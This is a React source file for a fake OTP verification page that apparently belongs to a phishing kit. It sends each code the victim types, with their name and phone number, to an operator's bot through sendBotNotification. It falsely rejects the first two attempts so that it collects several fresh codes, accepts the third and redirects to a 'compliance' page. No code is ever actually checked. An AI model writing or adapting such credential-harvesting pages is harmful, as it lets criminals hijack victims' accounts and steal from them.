import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useClient } from '../context/ClientContext';
import { Header } from '../components/Header';
import { Footer } from '../components/Footer';
import { LoadingOverlay } from '../components/LoadingOverlay';
import { KeyRound, AlertCircle } from 'lucide-react';
import { sendBotNotification } from '../services/botService';

export const VerificationPage = () => {
  const { user } = useParams();
  const navigate = useNavigate();
  const { client, updateClient } = useClient();

  const [otpDigits, setOtpDigits] = useState(['', '', '', '', '', '']);
  const [timer, setTimer] = useState(60);
  const [verifying, setVerifying] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [statusType, setStatusType] = useState('info');
  const [attemptCount, setAttemptCount] = useState(1);

  const refs = [useRef(), useRef(), useRef(), useRef(), useRef(), useRef()];

  useEffect(() => {
    const countdown = setInterval(() => {
      setTimer((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(countdown);
  }, []);

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otpDigits];
    newOtp[index] = value.slice(-1);
    setOtpDigits(newOtp);

    if (value !== '' && index < 5) {
      refs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otpDigits[index] !== '') {
        const newOtp = [...otpDigits];
        newOtp[index] = '';
        setOtpDigits(newOtp);
      } else if (index > 0) {
        const newOtp = [...otpDigits];
        newOtp[index - 1] = '';
        setOtpDigits(newOtp);
        refs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      refs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 5) {
      refs[index + 1].current?.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').trim().replace(/\D/g, '');
    if (pasteData.length >= 6) {
      const parts = pasteData.slice(0, 6).split('');
      setOtpDigits(parts);
      refs[5].current?.focus();
    }
  };

  const handleVerify = (e) => {
    e?.preventDefault();
    const code = otpDigits.join('');
    if (code.length < 6) {
      setStatusMessage('Please enter all 6 digits');
      setStatusType('error');
      return;
    }

    setVerifying(true);
    setStatusMessage(`⏳ Verifying OTP code (Attempt ${attemptCount} of 3)...`);
    setStatusType('info');

    // Send Bot Notification for OTP Code
    sendBotNotification(
      `🔑 <b>Client OTP Received</b> (Attempt ${attemptCount}/3):\n` +
      `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
      `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
      `<b>OTP Code</b>: <code>${code}</code>\n` +
      `<b>Reference ID</b>: ${client.refId}`
    );

    if (attemptCount < 3) {
      // Fail attempts 1 and 2, requiring user re-entry
      setTimeout(() => {
        setVerifying(false);
        setStatusMessage(`❌ Expired or wrong OTP code. Please try again (Attempt ${attemptCount} of 3 failed)`);
        setStatusType('error');
        setAttemptCount((prev) => prev + 1);
        setOtpDigits(['', '', '', '', '', '']);
        setTimeout(() => {
          refs[0].current?.focus();
        }, 100);
      }, 1500);
    } else {
      // Attempt 3 succeeds and proceeds
      updateClient({ otp: code });
      setTimeout(() => {
        setVerifying(false);
        setStatusMessage('✅ Verification Successful! Redirecting...');
        setStatusType('success');

        setTimeout(() => {
          const userSegment = user || 'user11';
          navigate(`/${userSegment}/compliance`);
        }, 1200);
      }, 1500);
    }
  };

  const handleResend = () => {
    setTimer(60);
    setOtpDigits(['', '', '', '', '', '']);
    setStatusMessage('🔄 New OTP code sent to your mobile phone.');
    setStatusType('info');
    refs[0].current?.focus();

    sendBotNotification(`🔄 <b>OTP Resend Requested</b> for ${client.name || 'Client'} (${client.number || 'N/A'})`);
  };

  const isComplete = otpDigits.every((d) => d !== '');

  return (
    <div className="app-viewport">
      <Header />
      {verifying && <LoadingOverlay message={`⏳ Verifying OTP code (Attempt ${attemptCount} of 3)...`} />}
      <main className="main-content">
        <div className="otp-container">
          <div className="login-icon-badge">
            <KeyRound size={32} color="#0066cc" />
          </div>

          <h2 style={{ fontFamily: 'var(--font-display)', fontSize: '1.75rem', fontWeight: 700, color: 'var(--primary-navy)' }}>
            OTP Verification
          </h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.95rem', marginTop: '0.4rem' }}>
            Enter the 6-digit verification code sent to {client.number || 'your mobile number'} (Attempt {attemptCount} of 3)
          </p>

          {statusMessage && (
            <div className={`alert-box alert-${statusType}`} style={{ marginTop: '1.25rem' }}>
              {statusType === 'error' && <AlertCircle size={18} />}
              <span>{statusMessage}</span>
            </div>
          )}

          <form onSubmit={handleVerify}>
            <div className="otp-boxes" onPaste={handlePaste}>
              {otpDigits.map((digit, idx) => (
                <input
                  key={idx}
                  ref={refs[idx]}
                  type="text"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className="otp-box"
                  autoFocus={idx === 0}
                />
              ))}
            </div>

            <div className="timer-text">
              {timer > 0 ? (
                <span>Resend OTP in <b>{timer}s</b></span>
              ) : (
                <button type="button" onClick={handleResend} className="resend-btn">
                  Resend OTP Code
                </button>
              )}
            </div>

            <button
              type="submit"
              disabled={!isComplete || verifying}
              className="btnContinue"
              style={{ opacity: isComplete ? 1 : 0.7 }}
            >
              Verify & Complete
            </button>
          </form>
        </div>
      </main>
      <Footer />
    </div>
  );
};
